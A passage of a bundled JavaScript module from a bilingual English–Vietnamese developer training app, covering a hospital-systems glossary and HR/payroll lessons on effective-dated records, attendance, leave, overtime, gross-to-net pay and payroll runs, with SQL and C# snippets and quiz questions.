VI: Yêu cầu xét nghiệm hoặc chụp chiếu của bác sĩ`},{term:"HIS / LIS / PACS",meaning:`Hospital system / lab system / image system
VI: Hệ thống bệnh viện / xét nghiệm / hình ảnh`},{term:"Result status · Trạng thái kết quả",meaning:`Pending → preliminary → final → corrected
VI: Chờ → sơ bộ → chính thức → đã hiệu chỉnh`},{term:"Critical value · Giá trị nguy hiểm",meaning:`Alert a person, record who confirmed
VI: Báo cho một người, ghi lại ai đã xác nhận`},{term:"Worklist",meaning:`Patient list sent from orders to the machine
VI: Danh sách người bệnh gửi từ chỉ định xuống máy`}]},{title:"Drugs and money",items:[{term:"Dose + unit · Liều + đơn vị",meaning:`Separate fields; never a silent default unit
VI: Trường riêng; không để đơn vị mặc định âm thầm`},{term:"mg vs mcg",meaning:`1 mg = 1000 mcg; a mix-up is 1000 times off
VI: 1 mg = 1000 mcg; nhầm lẫn là sai 1000 lần`},{term:"Allergy check · Kiểm tra dị ứng",meaning:`Needs coded allergies, not free text
VI: Cần dị ứng được mã hóa, không phải chữ tự do`},{term:"Lot + expiry · Số lô + hạn dùng",meaning:`FEFO: first expiry, first out; needed for recalls
VI: Hết hạn trước xuất trước; cần để thu hồi thuốc`},{term:"BHYT share · Tỷ lệ BHYT",meaning:`Depends on the case; store it as data
VI: Tùy từng trường hợp; lưu thành dữ liệu`},{term:"Rejected claim · Xuất toán",meaning:`Line the insurance agency will not pay
VI: Khoản cơ quan BHXH không chấp nhận thanh toán`}]},{title:"Safety and privacy",items:[{term:"Need-to-know · Cần mới được biết",meaning:`See only what your work requires
VI: Chỉ xem những gì công việc cần`},{term:"Audit log · Nhật ký truy cập",meaning:`Who viewed or changed what, and when
VI: Ai đã xem hoặc sửa gì, vào lúc nào`},{term:"Break the glass",meaning:`Emergency access with a reason, reviewed later
VI: Truy cập khẩn cấp có lý do, rà soát sau`},{term:"Entered in error · Nhập nhầm",meaning:`Mark it wrong and keep it; never hard delete
VI: Đánh dấu sai và giữ lại; không xóa cứng`},{term:"Downtime · Quy trình dự phòng",meaning:`Paper forms and printed lists when systems fail
VI: Biểu mẫu giấy và danh sách in sẵn khi hệ thống ngừng`}]},{title:"Standards",items:[{term:"ICD-10",meaning:`Diagnosis codes, for example J18.9
VI: Bộ mã chẩn đoán, ví dụ J18.9`},{term:"HL7 v2",meaning:`Older pipe-separated messages: MSH, PID, OBX
VI: Thông điệp cũ ngăn bằng dấu |: MSH, PID, OBX`},{term:"FHIR",meaning:`Web API with JSON resources like Patient
VI: Web API với resource JSON như Patient`},{term:"DICOM",meaning:`Standard for medical images and their data
VI: Chuẩn cho hình ảnh y khoa và dữ liệu kèm theo`}]}]},U=Object.freeze(Object.defineProperty({__proto__:null,default:F},Symbol.toStringTag,{value:"Module"})),j={id:"hr-payroll",group:"domain",title:"HR & Payroll",emoji:"👥",tagline:`People, time and pay: data that must be right every month.
VI: Con người, thời gian và tiền lương: dữ liệu phải đúng mỗi tháng.`,lessons:[{id:"hr-payroll.records",title:"Employee records and history · Hồ sơ nhân viên và lịch sử",summary:`Keep the history of contracts, jobs and salary, not only today’s value.
VI: Lưu lịch sử hợp đồng, chức danh và lương, không chỉ giá trị hiện tại.`,minutes:4,blocks:[{type:"text",text:`The **employee master** is one row per person: code, name, birth date, ID number, bank account.
Around it are records that change over time: **contracts**, **department**, **position** and **salary**.
VI: **Hồ sơ nhân viên** là một dòng cho mỗi người: mã, họ tên, ngày sinh, số CCCD, tài khoản ngân hàng.
VI: Xung quanh là các dữ liệu thay đổi theo thời gian: **hợp đồng lao động**, **phòng ban**, **chức danh** và **lương**.`},{type:"text",text:`Do not overwrite these values. Add a new row with **ValidFrom** and **ValidTo** dates. This is called an **effective-dated** record.
VI: Đừng ghi đè các giá trị này. Hãy thêm dòng mới có ngày **hiệu lực từ** và **hiệu lực đến**. Cách này gọi là dữ liệu **theo ngày hiệu lực**.`},{type:"diagram",text:`SalaryHistory, employee 7
┌──────────┬────────────┬────────────┐
│ Amount   │ ValidFrom  │ ValidTo    │
├──────────┼────────────┼────────────┤
│ 15 mil   │ 2026-01-01 │ 2026-03-31 │
│ 18 mil   │ 2026-04-01 │ (open)     │
└──────────┴────────────┴────────────┘

 Jan    Feb    Mar   │  Apr    May
 ───── 15 mil ───────┼──── 18 mil ────►
                     │
               raise on 1 April
 March payroll → must use 15 mil`},{type:"code",code:{lang:"sql",text:`-- Salary that was valid on @date
SELECT Amount
FROM SalaryHistory
WHERE EmployeeId = @emp
  AND ValidFrom <= @date
  AND (ValidTo IS NULL OR ValidTo >= @date);`}},{type:"diagram",text:`Org chart: Department.ParentId
            Director
               │
       ┌───────┴───────┐
     Sales          Finance
       │               │
   ┌───┴───┐       ┌───┴───┐
  Lan    Minh     Hoa    Tuan`},{type:"example",title:"The reprinted payslip",text:`HR changed Lan’s salary in place from 15 to 18 million. In May, Lan asked for a copy of her March payslip. The system printed 18 million, not the 15 million she was paid.
VI: HR sửa thẳng lương của Lan từ 15 lên 18 triệu. Tháng 5, Lan xin in lại phiếu lương tháng 3. Hệ thống in ra 18 triệu, không phải 15 triệu đã trả.`},{type:"list",items:["Ask: can two contracts overlap, or must one end before the next starts?","Ask: if someone moves department on the 15th, who pays for that month?","Ask: can HR enter a change with a past date? Who approves it?","Ask: what happens to records when an employee leaves and comes back?"]}],remember:`HR data has a timeline. Never overwrite it: add a new row with the date it starts.
VI: Dữ liệu nhân sự có dòng thời gian. Đừng ghi đè: thêm dòng mới với ngày bắt đầu hiệu lực.`,questions:[{id:"hr-payroll.records.1",kind:"mcq",difficulty:"easy",prompt:"Why store salary as rows with `ValidFrom` and `ValidTo`, instead of one `Salary` column on the employee?\nVI: Tại sao lưu lương thành nhiều dòng có `ValidFrom` và `ValidTo`, thay vì một cột `Salary` trên nhân viên?",choices:["It makes the employee table smaller and faster","Old periods can still be calculated with the right salary","It is the only way to store numbers with decimals","It stops two people from editing the same employee"],answer:1,why:`Payroll, payslip reprints and reports for past months need the salary that was valid then. One column only knows today’s value.
VI: Tính lương, in lại phiếu lương và báo cáo tháng cũ cần mức lương có hiệu lực lúc đó. Một cột chỉ biết giá trị hôm nay.`},{id:"hr-payroll.records.2",kind:"code",difficulty:"hard",prompt:"The table has the two rows from the lesson (old row ends 2026-03-31, new row starts 2026-04-01). What does this query return for `@d = '2026-03-31'`?\nVI: Bảng có hai dòng như trong bài. Câu truy vấn này trả về gì khi `@d = '2026-03-31'`?",code:{lang:"sql",text:`SELECT Amount FROM SalaryHistory
WHERE EmployeeId = 7
  AND ValidFrom <= @d
  AND (ValidTo IS NULL OR ValidTo > @d);`},choices:["15 mil","18 mil","No row","Both rows"],answer:2,why:"`ValidTo` is the last valid day, so the check must be `>=`. With `>`, the old row is excluded on 31 March, and the new row has not started yet.\nVI: `ValidTo` là ngày hiệu lực cuối cùng, nên phải so sánh `>=`. Dùng `>` thì dòng cũ bị loại vào ngày 31/3, còn dòng mới chưa bắt đầu.",remember:"Agree if ValidTo is inclusive, then test the last day."},{id:"hr-payroll.records.3",kind:"debug",difficulty:"medium",prompt:`A cost report for January now shows Minh in Finance. In January he was in Sales. He moved in March. What is the most likely cause?
VI: Báo cáo chi phí tháng 1 giờ hiện Minh ở phòng Tài chính. Tháng 1 anh ấy ở phòng Kinh doanh, tháng 3 mới chuyển. Nguyên nhân có khả năng nhất là gì?`,choices:["The report cache is old and must be cleared","Department is one column that was overwritten","The org chart tree has a loop in ParentId","Minh has two employee codes in the system"],answer:1,why:`If the department is stored in place, old reports read today’s value. A history table with dates keeps January in Sales.
VI: Nếu phòng ban được ghi đè, báo cáo cũ sẽ đọc giá trị hiện tại. Bảng lịch sử có ngày hiệu lực giữ tháng 1 ở phòng Kinh doanh.`},{id:"hr-payroll.records.4",kind:"truefalse",difficulty:"easy",prompt:"A department table with a `ParentId` column can store the whole org chart as a tree.\nVI: Bảng phòng ban có cột `ParentId` có thể lưu cả sơ đồ tổ chức dạng cây.",choices:["True","False"],answer:0,why:`Each department points to its parent. The top one has no parent. A recursive query can walk the tree.
VI: Mỗi phòng ban trỏ tới phòng ban cha. Phòng ban cao nhất không có cha. Truy vấn đệ quy có thể duyệt cả cây.`}]},{id:"hr-payroll.attendance",title:"Attendance and shifts · Chấm công và ca làm việc",summary:`Turn raw check-in and check-out punches into a correct timesheet.
VI: Biến dữ liệu quẹt thẻ vào ra thành bảng chấm công đúng.`,minutes:4,blocks:[{type:"text",text:`A time clock (fingerprint, face or card device) only records **punches**: who, which device, what time.
The system must match punches to a **shift** to know if a day is OK, late or missing.
VI: Máy chấm công (vân tay, khuôn mặt, thẻ) chỉ ghi **lượt chấm**: ai, máy nào, mấy giờ.
VI: Hệ thống phải ghép lượt chấm với **ca làm việc** để biết ngày đó đủ công, đi muộn hay thiếu.`},{type:"diagram",text:`Device ──► RawPunch ──► match to shift
                          │
                          ▼
        Timesheet (one row per day)
                          │
                          ▼
                  Payroll (work days)`},{type:"text",text:`Keep the raw punches as they came. Calculate the timesheet from them. Then you can recalculate after a rule changes.
VI: Giữ nguyên dữ liệu chấm công gốc. Tính bảng công từ đó. Khi quy định đổi, bạn có thể tính lại.`},{type:"diagram",text:`Night shift 22:00 → 06:00
     Mon 8 Jun        │   Tue 9 Jun
 ─────[IN 22:00 ======│====== OUT 06:00]──
                   midnight
 Work date = Mon 8 Jun (shift start date)`},{type:"diagram",text:`Timesheet, employee 7
Date  Shift In    Out   Status
───── ───── ───── ───── ───────────
06-08 Day   07:58 17:02 OK
06-09 Day   08:17 17:00 Late 17 min
06-10 Day   07:55 --    Missing out
06-11 Night 21:59 06:03 OK`},{type:"example",title:"The factory night shift",text:`A worker checks in Monday 22:00 and out Tuesday 06:00. If you group punches by calendar date, Monday has only IN and Tuesday has only OUT. Both days show a missing punch.
VI: Công nhân vào ca 22:00 thứ Hai, ra ca 06:00 thứ Ba. Nếu gom lượt chấm theo ngày lịch, thứ Hai chỉ có giờ vào, thứ Ba chỉ có giờ ra. Cả hai ngày đều báo thiếu công.`},{type:"list",items:["Missing punch: show it, and let the employee send a correction for approval","Double punch: two scans one minute apart; keep the first IN and the last OUT","Grace time: is 08:05 late? HR decides the minutes, not the developer","Device clock wrong after a power cut: store device time and server time"]}],remember:`Keep raw punches. Match them to shifts, not to calendar dates.
VI: Giữ dữ liệu chấm công gốc. Ghép theo ca làm việc, không theo ngày lịch.`,questions:[{id:"hr-payroll.attendance.1",kind:"debug",difficulty:"medium",prompt:`Night-shift workers show "missing punch" on two days every week. Day-shift workers are fine. What is the most likely cause?
VI: Công nhân ca đêm bị báo "thiếu công" hai ngày mỗi tuần. Ca ngày thì bình thường. Nguyên nhân có khả năng nhất là gì?`,choices:["Punches are grouped by calendar date, not by shift","The time clock cannot read fingers at night","The night shift has no lunch break configured","The timesheet table has too many rows to load"],answer:0,why:`A shift that crosses midnight has IN on one date and OUT on the next. Matching by shift window keeps both punches together.
VI: Ca qua nửa đêm có giờ vào ngày này và giờ ra ngày sau. Ghép theo khung giờ của ca thì hai lượt chấm nằm chung một ngày công.`},{id:"hr-payroll.attendance.2",kind:"scenario",difficulty:"easy",prompt:`An employee forgot to check out. What should the system do?
VI: Nhân viên quên chấm công lúc ra về. Hệ thống nên làm gì?`,choices:["Assume 17:00 and count a full day","Delete the IN punch to keep data clean","Mark it missing and allow an approved fix","Count zero hours and say nothing"],answer:2,why:`Guessing the time hides the problem and can pay wrong hours. A visible status plus a correction request with approval keeps the data honest.
VI: Tự đoán giờ sẽ che mất lỗi và có thể trả sai giờ công. Hiện trạng thái thiếu và cho gửi đơn điều chỉnh có duyệt thì dữ liệu mới đúng.`},{id:"hr-payroll.attendance.3",kind:"compare",difficulty:"medium",prompt:`Design A saves only the final timesheet. Design B saves raw punches and calculates the timesheet from them. Which is better?
VI: Thiết kế A chỉ lưu bảng công cuối cùng. Thiết kế B lưu lượt chấm gốc rồi tính bảng công từ đó. Cách nào tốt hơn?`,choices:["A, because it uses less storage","B, because you can recheck and recalculate","Both are the same for payroll","A, because raw punches are not needed after a day"],answer:1,why:`Rules change and employees dispute hours. With raw punches you can show the evidence and recalculate. With only the result, you cannot.
VI: Quy định thay đổi và nhân viên có thể khiếu nại giờ công. Có dữ liệu gốc thì bạn đưa được bằng chứng và tính lại. Chỉ có kết quả thì không.`},{id:"hr-payroll.attendance.4",kind:"debug",difficulty:"hard",prompt:`On one day, everyone at the Hai Phong site is "late" by about one hour. Other sites are normal. What do you check first?
VI: Có một ngày, cả chi nhánh Hải Phòng đều bị "đi muộn" khoảng một giờ. Các chi nhánh khác bình thường. Bạn kiểm tra gì trước?`,choices:["The late rule in the shift settings","The clock and time zone of that device","The salary of the people at that site","The network speed of the head office"],answer:1,why:`One site, one day, the same offset for everyone points to the device clock. Compare device time with server receive time.
VI: Một chi nhánh, một ngày, mọi người lệch cùng một khoảng thì thường do đồng hồ của máy. Hãy so giờ trên máy với giờ máy chủ nhận dữ liệu.`}]},{id:"hr-payroll.leave",title:"Leave management · Quản lý nghỉ phép",summary:`Leave types, balances, accrual, approval and overlapping requests.
VI: Loại nghỉ, quỹ phép, cộng phép, phê duyệt và đơn nghỉ trùng ngày.`,minutes:4,blocks:[{type:"text",text:`Each **leave type** has its own rules: annual leave, sick leave, unpaid leave, wedding leave, maternity leave.
Some are paid by the company, some by social insurance, some are unpaid.
VI: Mỗi **loại nghỉ** có quy định riêng: phép năm, nghỉ ốm, nghỉ không lương, nghỉ cưới, thai sản.
VI: Có loại công ty trả lương, có loại bảo hiểm xã hội chi trả, có loại không lương.`},{type:"text",text:`The **balance** is how many days are left. Build it as a ledger of plus and minus lines, like a bank account.
VI: **Quỹ phép** là số ngày còn lại. Hãy lưu như sổ cái gồm các dòng cộng và trừ, giống tài khoản ngân hàng.`},{type:"diagram",text:`LeaveLedger, annual leave 2026
Date   Reason      Days   Balance
────── ─────────── ────── ───────
01-01  Carry-over  +2.0   2.0
01-31  Accrual     +1.0   3.0
02-28  Accrual     +1.0   4.0
03-10  Taken       -1.5   2.5
03-31  Accrual     +1.0   3.5`},{type:"diagram",text:`Draft ──► Submitted ──► Approved ──► Taken
              │             │
              ▼             ▼
          Rejected      Cancelled
                     (days go back)`},{type:"example",title:"Accrual and carry-over",text:`For example, 12 days a year can accrue as 1 day each month. Unused days may carry over until a cut-off date, then expire. The exact rules are company policy and must come from HR.
VI: Ví dụ 12 ngày phép một năm có thể cộng dần 1 ngày mỗi tháng. Phép chưa dùng có thể chuyển sang năm sau đến một hạn nhất định, sau đó hết hạn. Quy định cụ thể do HR cung cấp.`},{type:"code",code:{lang:"sql",text:`-- Does the new request [@from, @to]
-- overlap an existing one?
SELECT COUNT(*) FROM LeaveRequest
WHERE EmployeeId = @emp
  AND Status IN ('Submitted', 'Approved')
  AND FromDate <= @to
  AND ToDate   >= @from;`}},{type:"list",items:["Half day: store Morning or Afternoon, and amount 0.5","Count working days only: skip weekly days off and public holidays","Ask: can the balance go negative? Who approves when the manager is away?","Ask: what happens to unused days when someone leaves the company?"]}],remember:`A leave balance is a ledger of dated lines, not one number you edit.
VI: Quỹ phép là sổ ghi các dòng có ngày, không phải một con số bị sửa đi sửa lại.`,questions:[{id:"hr-payroll.leave.1",kind:"code",difficulty:"medium",prompt:`An approved leave runs from 10 to 12 June. A new request is for 12 to 13 June. Does the overlap check flag it?
VI: Đơn nghỉ đã duyệt từ 10 đến 12/6. Đơn mới xin từ 12 đến 13/6. Câu kiểm tra trùng có phát hiện không?`,code:{lang:"sql",text:`-- existing: FromDate 06-10, ToDate 06-12
-- new:      @from 06-12,    @to 06-13
AND FromDate <= @to
AND ToDate   >= @from`},choices:["Yes, both conditions are true","No, only the first one is true","No, the dates only touch","Only if both are approved"],answer:0,why:`06-10 <= 06-13 is true, and 06-12 >= 06-12 is true. Both requests include 12 June, so they really overlap.
VI: 10/6 <= 13/6 đúng, và 12/6 >= 12/6 cũng đúng. Cả hai đơn đều có ngày 12/6 nên đúng là bị trùng.`},{id:"hr-payroll.leave.2",kind:"compare",difficulty:"medium",prompt:`An employee asks: "Why is my balance 3.5 days?" Which design can answer best?
VI: Nhân viên hỏi: "Sao quỹ phép của tôi còn 3,5 ngày?" Thiết kế nào trả lời tốt nhất?`,choices:["One Balance column that is updated in place","A ledger of dated lines with a reason each","A yearly Excel file kept by HR","A Balance column plus a last-updated date"],answer:1,why:`A ledger shows every plus and minus with its date and reason. One number shows only the result, not how you got there.
VI: Sổ cái cho thấy từng dòng cộng trừ, có ngày và lý do. Một con số chỉ cho thấy kết quả, không cho thấy vì sao.`},{id:"hr-payroll.leave.3",kind:"debug",difficulty:"hard",prompt:`A leave from Friday to the next Thursday takes 7 days from the balance. HR expected 5. What is the most likely bug?
VI: Đơn nghỉ từ thứ Sáu đến thứ Năm tuần sau bị trừ 7 ngày phép. HR nghĩ là 5. Lỗi có khả năng nhất là gì?`,choices:["The request was approved twice by mistake","The code counts calendar days, not work days","Accrual for this month did not run yet","The half-day flag was set on both ends"],answer:1,why:`Saturday and Sunday were counted. Leave days must use the work calendar of that employee, including public holidays.
VI: Thứ Bảy và Chủ nhật đã bị tính. Ngày nghỉ phải tính theo lịch làm việc của nhân viên đó, có tính cả ngày lễ.`},{id:"hr-payroll.leave.4",kind:"truefalse",difficulty:"easy",prompt:`An employee has approved leave for the morning and checks in at 13:00. The system should mark her late.
VI: Nhân viên được duyệt nghỉ buổi sáng và chấm công vào lúc 13:00. Hệ thống nên ghi nhận cô ấy đi muộn.`,choices:["True","False"],answer:1,why:`Attendance must read approved leave. Her work starts in the afternoon, so 13:00 is on time.
VI: Chấm công phải đọc dữ liệu nghỉ phép đã duyệt. Cô ấy làm buổi chiều nên 13:00 là đúng giờ.`}]},{id:"hr-payroll.overtime",title:"Overtime · Làm thêm giờ",summary:`Approved extra hours, rates by day type, and caps.
VI: Giờ làm thêm được duyệt, hệ số theo loại ngày và giới hạn giờ.`,minutes:4,blocks:[{type:"text",text:`**Overtime** (OT) is work outside the normal schedule. Most companies require approval before the work.
VI: **Làm thêm giờ** (tăng ca) là thời gian làm ngoài lịch làm việc bình thường. Đa số công ty yêu cầu duyệt trước khi làm.`},{type:"diagram",text:`OT request ──► Approved: 2 h
                     │
Punches show: 3.5 h  │
                     ▼
Paid hours = min(approved, actual)
           = 2 h  (if policy says so)
Extra 1.5 h → flag for the manager`},{type:"text",text:`The pay rate depends on the **day type**. In Vietnam, for example, rates like these are common. Always check the current rules with HR.
VI: Hệ số lương phụ thuộc vào **loại ngày**. Ở Việt Nam, ví dụ thường gặp như bảng dưới. Luôn kiểm tra quy định hiện hành với HR.`},{type:"diagram",text:`Day type          Rate (example only)
───────────────── ───────────────────
Normal work day   150%
Weekly day off    200%
Public holiday    300%
Night hours       extra; ask HR how`},{type:"example",title:"Sunday work",text:`Hourly rate 100,000 VND. Sunday is the weekly day off. Lan works 3 approved hours. Example: 3 × 100,000 × 200% = 600,000 VND.
VI: Lương giờ 100.000 đồng. Chủ nhật là ngày nghỉ hằng tuần. Lan làm 3 giờ đã duyệt. Ví dụ: 3 × 100.000 × 200% = 600.000 đồng.`},{type:"code",code:{lang:"csharp",text:`// Holiday first: a holiday can fall on Sunday
DayType GetDayType(DateOnly d, Calendar cal)
{
    if (cal.IsPublicHoliday(d))
        return DayType.Holiday;
    if (cal.IsWeeklyOff(d))
        return DayType.WeeklyOff;
    return DayType.Normal;
}
// Rates come from a table with ValidFrom,
// not from constants in code.`}},{type:"text",text:`The law also limits OT hours per day, month and year. For example, a monthly cap of 40 hours. Check every cap against the **total**, not only one request.
VI: Luật cũng giới hạn số giờ làm thêm theo ngày, tháng và năm. Ví dụ giới hạn 40 giờ mỗi tháng. Hãy kiểm tra giới hạn trên **tổng số giờ**, không chỉ trên từng đơn.`}],remember:`OT pay = approved hours × hourly rate × day-type rate. Rates and caps live in data, not code.
VI: Tiền làm thêm = giờ được duyệt × lương giờ × hệ số loại ngày. Hệ số và giới hạn để trong dữ liệu, không viết cứng trong code.`,questions:[{id:"hr-payroll.overtime.1",kind:"mcq",difficulty:"easy",prompt:`Hourly rate 50,000 VND. An employee works 4 approved hours on a public holiday. Use the example rate of 300%. What is the OT pay?
VI: Lương giờ 50.000 đồng. Nhân viên làm 4 giờ đã duyệt vào ngày lễ. Dùng hệ số ví dụ 300%. Tiền làm thêm là bao nhiêu?`,choices:["200,000 VND","300,000 VND","400,000 VND","600,000 VND"],answer:3,why:`4 × 50,000 × 300% = 600,000 VND. 400,000 would be the 200% weekly day-off rate.
VI: 4 × 50.000 × 300% = 600.000 đồng. 400.000 là kết quả của hệ số 200% ngày nghỉ hằng tuần.`},{id:"hr-payroll.overtime.2",kind:"scenario",difficulty:"medium",prompt:`Policy: only approved OT is paid. The manager approved 2 hours. Punches show 3.5 hours. What should payroll use?
VI: Quy định: chỉ trả giờ làm thêm đã duyệt. Quản lý duyệt 2 giờ. Dữ liệu chấm công cho thấy 3,5 giờ. Bảng lương nên dùng số nào?`,choices:["3.5 hours, because punches are the truth","2 hours, and flag 1.5 hours for review","0 hours, because the numbers do not match","2.75 hours, the average of both values"],answer:1,why:`The policy pays approved hours. The extra 1.5 hours is still shown, so the manager can approve more or ask why.
VI: Quy định trả theo giờ được duyệt. Phần 1,5 giờ dư vẫn được hiển thị để quản lý duyệt thêm hoặc hỏi lý do.`},{id:"hr-payroll.overtime.3",kind:"debug",difficulty:"hard",prompt:`A public holiday fell on a Sunday. OT for that day was paid at 200%, not 300%. Look at the code. What is wrong?
VI: Một ngày lễ rơi vào Chủ nhật. Tiền làm thêm hôm đó tính 200% chứ không phải 300%. Xem code, lỗi ở đâu?`,code:{lang:"csharp",text:`if (cal.IsWeeklyOff(d))
    return DayType.WeeklyOff;
if (cal.IsPublicHoliday(d))
    return DayType.Holiday;
return DayType.Normal;`},choices:["The holiday check must come first","Sunday should never be a weekly day off","DayType needs a fourth value for Sunday","The calendar is missing the holiday date"],answer:0,why:`The weekly-off check returns before the holiday check runs. Put the highest rate rule first. Also ask HR how they want this case paid.
VI: Điều kiện ngày nghỉ hằng tuần trả về trước khi kiểm tra ngày lễ. Hãy đặt quy tắc có hệ số cao nhất lên trước. Cũng nên hỏi HR muốn trả trường hợp này thế nào.`},{id:"hr-payroll.overtime.4",kind:"scenario",difficulty:"medium",prompt:`The monthly OT cap is 40 hours (example). Each request is under 8 hours, but one worker reached 52 hours this month. What is missing?
VI: Giới hạn làm thêm là 40 giờ mỗi tháng (ví dụ). Mỗi đơn đều dưới 8 giờ, nhưng một công nhân đã đạt 52 giờ tháng này. Thiếu kiểm tra gì?`,choices:["A check on the size of each request","A check on the month total before approval","A rule to block OT on weekly days off","A check that the worker has punched in"],answer:1,why:`Caps are about the total. Before approving, add the new hours to the approved hours of the month and the year.
VI: Giới hạn tính trên tổng số giờ. Trước khi duyệt, hãy cộng giờ mới với số giờ đã duyệt trong tháng và trong năm.`}]},{id:"hr-payroll.gross-net",title:"From gross to net · Từ lương gross đến lương net",summary:`Gross pay, allowances, insurance, income tax, and the net amount paid.
VI: Lương gộp, phụ cấp, bảo hiểm, thuế TNCN và số tiền thực nhận.`,minutes:5,blocks:[{type:"text",text:`**Gross** pay is the total before deductions: base salary plus allowances, OT and bonuses. **Net** pay is what the employee receives in the bank.
VI: Lương **gross** là tổng thu nhập trước khi khấu trừ: lương cơ bản cộng phụ cấp, làm thêm và thưởng. Lương **net** là số tiền nhân viên thực nhận.`},{type:"diagram",text:`Gross pay
  − employee insurance (BHXH, BHYT, BHTN)
  − personal income tax (thuế TNCN)
  = Net pay (thực nhận)`},{type:"list",items:["Insurance: for example 8% BHXH, 1.5% BHYT, 1% BHTN for the employee. Rates and the salary cap change.","Allowances: some are taxable, some are tax-free up to a limit. Store a flag per allowance type.","Income tax: deduct insurance, a personal deduction and a deduction per registered dependant.","Then apply a progressive table: higher income, higher rate on that part."]},{type:"diagram",text:`EXAMPLE ONLY, made-up rules (VND)
Base salary (insurance base) 18,000,000
Lunch allowance (tax-free)    2,000,000
Gross                        20,000,000
Insurance 10.5% × 18 mil     −1,890,000
Deductions (example)        −10,000,000
Taxable: 20 − 2 − 1.89 − 10   6,110,000
Tax (example table)            −361,000
Net = 20,000,000 − 1,890,000
        − 361,000            17,749,000`},{type:"example",title:"Why the flag matters",text:`If the lunch allowance is marked taxable by mistake, the taxable income rises by 2 million. The tax goes up, and net pay goes down. The employee will notice.
VI: Nếu phụ cấp ăn trưa bị đánh dấu nhầm là chịu thuế, thu nhập tính thuế tăng thêm 2 triệu. Thuế tăng và lương thực nhận giảm. Nhân viên sẽ phát hiện ra.`},{type:"code",code:{lang:"csharp",text:`var insBase = Math.Min(baseSalary, insCap);
var ins = insBase * insRate;   // from config
var taxable = gross - taxFreeAllowances - ins
    - personalDed - dependants * depDed;
var tax = taxable > 0 ? TaxTable(taxable) : 0;
var net = gross - ins - tax;`}},{type:"text",text:`The company also pays its own insurance share. That is a company cost. It is not taken from the employee’s net pay.
VI: Công ty cũng đóng phần bảo hiểm của mình. Đó là chi phí của công ty, không trừ vào lương thực nhận của nhân viên.`}],remember:`Net = gross − employee insurance − income tax. Every rate, cap and deduction is dated config.
VI: Net = gross − bảo hiểm phần người lao động − thuế TNCN. Mọi tỷ lệ, mức trần và mức giảm trừ là cấu hình có ngày hiệu lực.`,questions:[{id:"hr-payroll.gross-net.1",kind:"mcq",difficulty:"easy",prompt:`Which formula gives the net pay?
VI: Công thức nào cho ra lương net?`,choices:["Gross − company insurance − tax","Gross − employee insurance − tax","Base salary + allowances − tax","Gross − all allowances − insurance"],answer:1,why:`The employee’s insurance share and income tax are taken from gross. The company share is a company cost, not a deduction.
VI: Phần bảo hiểm của người lao động và thuế TNCN được trừ từ lương gross. Phần của công ty là chi phí công ty, không trừ vào lương.`},{id:"hr-payroll.gross-net.2",kind:"debug",difficulty:"medium",prompt:`For a low-paid employee with two dependants, net pay is higher than gross. What is the most likely bug?
VI: Với một nhân viên lương thấp có hai người phụ thuộc, lương net lại cao hơn gross. Lỗi có khả năng nhất là gì?`,code:{lang:"csharp",text:`var taxable = gross - ins - deductions;
var tax = TaxTable(taxable);
var net = gross - ins - tax;`},choices:["Insurance is calculated twice","Negative taxable income gives a negative tax","Dependants should be added, not deducted","The tax table uses the wrong year"],answer:1,why:`Deductions can be larger than income. Then taxable is negative and the tax becomes a refund. Taxable income must not go below zero.
VI: Các khoản giảm trừ có thể lớn hơn thu nhập. Khi đó thu nhập tính thuế bị âm và thuế thành số âm. Thu nhập tính thuế không được nhỏ hơn 0.`},{id:"hr-payroll.gross-net.3",kind:"scenario",difficulty:"hard",prompt:`A director earns a very high salary. Her insurance deduction is far bigger than HR expected. What do you check first?
VI: Một giám đốc có lương rất cao. Số tiền bảo hiểm bị trừ lớn hơn nhiều so với HR dự kiến. Bạn kiểm tra gì trước?`,choices:["Whether the insurance salary cap is applied","Whether her dependants are registered","Whether the lunch allowance is taxable","Whether her bank account is correct"],answer:0,why:"Insurance is charged on a salary base that has a maximum. Without `Math.Min` against the cap, high salaries pay too much.\nVI: Bảo hiểm tính trên mức lương đóng có mức trần. Không giới hạn theo mức trần thì người lương cao bị trừ quá nhiều."},{id:"hr-payroll.gross-net.4",kind:"compare",difficulty:"medium",prompt:`The insurance rate changes from next January. Which design handles it best?
VI: Tỷ lệ bảo hiểm thay đổi từ tháng 1 năm sau. Thiết kế nào xử lý tốt nhất?`,choices:["A constant in code, changed in a new release","A rates table with ValidFrom, read by period","One setting row that HR edits on 1 January","Ask HR to fix the payslips by hand in Excel"],answer:1,why:`A dated table lets December use the old rate and January use the new one. Rerunning an old month still gives the old result.
VI: Bảng có ngày hiệu lực giúp tháng 12 dùng tỷ lệ cũ, tháng 1 dùng tỷ lệ mới. Tính lại tháng cũ vẫn ra kết quả cũ.`}]},{id:"hr-payroll.run",title:"Running payroll · Chạy bảng lương",summary:`Calculate, review, approve, lock, pay, and handle late changes.
VI: Tính, kiểm tra, duyệt, chốt, chi trả và xử lý thay đổi đến muộn.`,minutes:5,blocks:[{type:"text",text:`A **payroll period** is usually one month. Data has a **cut-off date**: changes after it go to the next period.
VI: **Kỳ lương** thường là một tháng. Dữ liệu có **ngày chốt**: thay đổi sau ngày đó sẽ tính vào kỳ sau.`},{type:"diagram",text:`Draft ──► Calculated ──► Reviewed
                            │
                            ▼
                        Approved
                            │
                            ▼
 Paid ◄─── Bank file ◄─── Locked
 Locked = read-only. Any later change
 becomes an adjustment in a new period.`},{type:"text",text:`**Retro pay** (truy lĩnh) is money for a past period that comes late. Do not reopen the old run. Pay the difference in the current run.
VI: **Truy lĩnh** là khoản tiền của kỳ trước nhưng phát sinh muộn. Đừng mở lại kỳ cũ. Trả phần chênh lệch trong kỳ hiện tại.`},{type:"diagram",text:`Raise approved 10 May, valid from 1 April
April run (locked): paid 15 mil
May run:  May salary          18 mil
          Retro for April  +   3 mil
          (18 − 15 for April)`},{type:"example",title:"The 4-dong difference",text:`The payroll report says 812,450,000 VND. The bank file says 812,449,996 VND. One rounded each line, the other rounded only the total. Pick one rule and use it everywhere.
VI: Báo cáo lương ghi 812.450.000 đồng. File ngân hàng ghi 812.449.996 đồng. Một bên làm tròn từng dòng, bên kia chỉ làm tròn tổng. Hãy chọn một quy tắc và dùng ở mọi nơi.`},{type:"list",items:["Rounding: VND has no decimals. Ask HR where and how to round.","Bank file: check the sum equals the payroll total before sending.","Bank file: employees without a bank account need another way to be paid.","Payslips: each person sees only their own, by portal or protected email."]},{type:"code",code:{lang:"sql",text:`-- Block changes to a locked period
UPDATE PayrollLine SET Amount = @amount
WHERE Id = @id
  AND RunId IN (SELECT Id FROM PayrollRun
                WHERE Status <> 'Locked');
